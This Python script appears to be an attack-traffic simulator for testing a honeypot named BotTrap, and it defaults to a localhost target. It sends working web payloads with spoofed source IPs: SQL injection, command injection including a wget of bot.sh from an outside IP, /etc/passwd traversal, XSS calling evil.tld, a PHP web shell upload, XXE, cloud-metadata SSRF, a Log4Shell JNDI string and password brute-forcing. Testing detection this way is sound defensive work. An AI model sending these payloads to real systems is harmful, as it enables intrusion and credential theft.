"""Attack simulator script skeleton."""
import argparse
import random
import time
import requests

# Diverse global public IPs so ip-api.com populates the Attack Map & Top Attackers
GLOBAL_ATTACKER_IPS = [
    "185.220.101.4",    # Germany
    "45.155.205.233",   # Russia
    "103.21.244.12",    # India
    "218.92.0.107",     # China
    "104.244.42.1",     # United States
    "177.54.148.20",    # Brazil
    "41.203.72.18",     # Nigeria
    "103.145.13.90",    # Singapore
    "185.156.73.54",    # Netherlands
    "91.132.147.168",   # France
    "211.234.120.55",   # South Korea
    "197.232.61.12",    # Kenya
    "178.128.164.89",   # United Kingdom
    "190.14.36.91",     # Colombia
    "139.59.42.110",    # India (Mumbai)
]

# ~50 mixed attack payloads covering all categories + novel payloads for LLM fallback
ATTACK_SCENARIOS = [
    # --- SQL Injection ---
    {"method": "POST", "path": "/admin/login", "data": "username=admin&password=' OR 1=1 --", "ua": "sqlmap/1.7.8"},
    {"method": "GET", "path": "/api/v1/users", "params": {"id": "1 UNION SELECT username,password FROM users--"}, "ua": "sqlmap/1.7.8"},
    {"method": "POST", "path": "/wp-login.php", "data": "log=admin' AND SLEEP(5)--&pwd=test", "ua": "Mozilla/5.0"},
    {"method": "GET", "path": "/api/v1/config", "params": {"key": "1' OR 1=1"}, "ua": "python-requests/2.31.0"},
    {"method": "GET", "path": "/admin", "params": {"user": "admin' UNION SELECT table_name FROM information_schema.tables--"}, "ua": "sqlmap/1.7.8"},
    {"method": "POST", "path": "/api/v1/login", "json": {"email": "admin@corp.com' OR 1=1--", "password": "123"}, "ua": "curl/8.1.2"},

    # --- Command Injection ---
    {"method": "POST", "path": "/api/v1/config", "data": "host=127.0.0.1; cat /etc/passwd", "ua": "curl/8.1.2"},
    {"method": "GET", "path": "/admin/login", "params": {"debug": "$(whoami)"}, "ua": "python-urllib3/2.0"},
    {"method": "POST", "path": "/api/v1/users", "data": "name=test | id", "ua": "Mozilla/5.0"},
    {"method": "GET", "path": "/api/v1/config", "params": {"cmd": "`wget http://185.220.101.4/bot.sh`"}, "ua": "curl/7.88.1"},
    {"method": "POST", "path": "/administrator", "data": "action=ping&ip=8.8.8.8; ls -la", "ua": "Go-http-client/1.1"},

    # --- Path Traversal ---
    {"method": "GET", "path": "/api/v1/config", "params": {"file": "../../../../etc/passwd"}, "ua": "curl/8.1.2"},
    {"method": "GET", "path": "/admin", "params": {"template": "%2e%2e/%2e%2e/%2e%2e/etc/passwd"}, "ua": "Mozilla/5.0"},
    {"method": "GET", "path": "/wp-admin", "params": {"load": "../../../windows/win.ini"}, "ua": "DotDotPwn/3.0"},
    {"method": "GET", "path": "/api/v1/users", "params": {"avatar": "../../../../boot.ini"}, "ua": "python-requests/2.31.0"},

    # --- Sensitive File Probes ---
    {"method": "GET", "path": "/.env", "ua": "Mozilla/5.0 (compatible; CloudScanner/1.0)"},
    {"method": "GET", "path": "/.git/config", "ua": "git-dumper/1.0"},
    {"method": "GET", "path": "/config.php", "ua": "ffuf/v2.1.0"},
    {"method": "GET", "path": "/backup.sql", "ua": "gobuster/3.6"},
    {"method": "GET", "path": "/.env", "ua": "python-requests/2.31.0"},

    # --- XSS ---
    {"method": "GET", "path": "/login", "params": {"next": "<script>alert(document.cookie)</script>"}, "ua": "Mozilla/5.0"},
    {"method": "POST", "path": "/api/v1/users", "data": "bio=<img src=x onerror=alert(1)>", "ua": "Mozilla/5.0"},
    {"method": "GET", "path": "/admin/login", "params": {"msg": "<svg onload=fetch('//evil.tld')>"}, "ua": "XSStrike/3.1.5"},
    {"method": "GET", "path": "/wp-login.php", "params": {"redirect_to": "javascript:alert(1)"}, "ua": "Mozilla/5.0"},

    # --- Vulnerability Scans ---
    {"method": "GET", "path": "/phpmyadmin/", "ua": "Mozilla/5.00 (Nikto/2.1.6)"},
    {"method": "GET", "path": "/administrator", "ua": "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"},
    {"method": "GET", "path": "/api/v1/config", "ua": "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"},
    {"method": "GET", "path": "/wp-admin", "ua": "WPScan v3.8.25"},
    {"method": "GET", "path": "/admin", "ua": "DirBuster-1.0-RC1"},
    {"method": "GET", "path": "/", "ua": "Mozilla/5.0 zgrab/0.x"},

    # --- Web Shell Upload ---
    {
        "method": "POST",
        "path": "/wp-admin",
        "headers_extra": {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary"},
        "data": '------WebKitFormBoundary\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php system($_GET["c"]); ?>\r\n------WebKitFormBoundary--',
        "ua": "Mozilla/5.0",
    },
    {
        "method": "POST",
        "path": "/admin/login",
        "data": 'Content-Disposition: form-data; name="upload"; filename="cmd.jsp"',
        "ua": "curl/8.1.2",
    },

    # --- Recon ---
    {"method": "GET", "path": "/admin/login", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
    {"method": "GET", "path": "/wp-login.php", "ua": "Mozilla/5.0 (X11; Linux x86_64)"},
    {"method": "GET", "path": "/phpmyadmin/", "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"},
    {"method": "GET", "path": "/robots.txt", "ua": "Googlebot/2.1 (+http://www.google.com/bot.html)"},
    {"method": "GET", "path": "/administrator", "ua": "curl/8.1.2"},

    # --- Novel / Ambiguous payloads (designed to trigger LLM classification) ---
    {"method": "POST", "path": "/api/v1/users", "json": {"__proto__": {"isAdmin": True}}, "ua": "node-fetch/3.3.1"},
    {"method": "POST", "path": "/api/v1/config", "data": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>', "ua": "Java/17.0.2"},
    {"method": "GET", "path": "/api/v1/users", "params": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}, "ua": "python-httpx/0.25.0"},
    {"method": "POST", "path": "/api/v1/login", "data": "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.", "ua": "PostmanRuntime/7.36.0"},
    {"method": "GET", "path": "/admin", "params": {"q": "${jndi:ldap://185.220.101.4:1389/Exploit}"}, "ua": "Mozilla/5.0"},
]


def build_attack_queue() -> list[tuple[str, dict]]:
    """Builds ~50 mixed requests including a concentrated brute-force burst from one IP."""
    queue: list[tuple[str, dict]] = []

    for scenario in ATTACK_SCENARIOS:
        attacker_ip = random.choice(GLOBAL_ATTACKER_IPS)
        queue.append((attacker_ip, scenario))

    # Add a 6-request brute-force burst from a single IP to trigger the Brute Force rule
    brute_ip = GLOBAL_ATTACKER_IPS[1]
    passwords = ["admin123", "password", "123456", "qwerty", "root2026", "letmein"]
    for pwd in passwords:
        queue.append(
            (
                brute_ip,
                {
                    "method": "POST",
                    "path": "/admin/login",
                    "data": f"username=admin&password={pwd}",
                    "ua": "Hydra v9.5",
                },
            )
        )

    random.shuffle(queue)
    return queue


def run_simulation(target: str, rate: float) -> None:
    target = target.rstrip("/")
    delay = 1.0 / max(rate, 0.1)
    queue = build_attack_queue()

    print(f"[*] Starting BotTrap Attack Simulator -> {target}")
    print(f"[*] Sending {len(queue)} simulated attacks at ~{rate:.1f} req/s...\n")

    sent = 0
    for idx, (ip, req) in enumerate(queue, start=1):
        url = f"{target}{req['path']}"
        headers = {
            "User-Agent": req.get("ua", "Mozilla/5.0"),
            "X-Forwarded-For": ip,
        }
        if "headers_extra" in req:
            headers.update(req["headers_extra"])

        try:
            resp = requests.request(
                method=req["method"],
                url=url,
                params=req.get("params"),
                data=req.get("data"),
                json=req.get("json"),
                headers=headers,
                timeout=10,
            )
            sent += 1
            print(f"[{idx:02d}/{len(queue)}] {ip:<15} {req['method']:<4} {req['path']:<18} -> HTTP {resp.status_code}")
        except requests.RequestException as exc:
            print(f"[{idx:02d}/{len(queue)}] {ip:<15} {req['method']:<4} {req['path']:<18} -> ERROR: {exc}")

        if idx < len(queue):
            time.sleep(delay)

    print(f"\n[+] Simulation complete: {sent}/{len(queue)} requests delivered.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BotTrap Attack Traffic Simulator")
    parser.add_argument(
        "--target",
        default="http://localhost:5000",
        help="Base URL of the BotTrap honeypot (default: http://localhost:5000)",
    )
    parser.add_argument(
        "--rate",
        type=float,
        default=3.0,
        help="Requests per second (default: 3.0)",
    )
    args = parser.parse_args()
    run_simulation(target=args.target, rate=args.rate)
